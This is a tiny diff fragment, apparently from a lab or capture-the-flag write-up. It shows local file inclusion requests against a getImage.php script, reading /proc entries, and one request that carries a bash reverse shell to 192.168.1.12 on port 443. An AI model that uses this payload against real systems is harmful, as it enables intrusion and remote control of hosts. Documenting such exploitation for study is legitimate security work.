@@ -113,4 +113,3 @@ http://192.168.1.5/cgi-data/getImage.php?file=/proc/536/cmdline
 http://192.168.1.5/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=bash -c "bash -i >&/dev/tcp/192.168.1.12/443 0>&1"
 
 ```
-- 
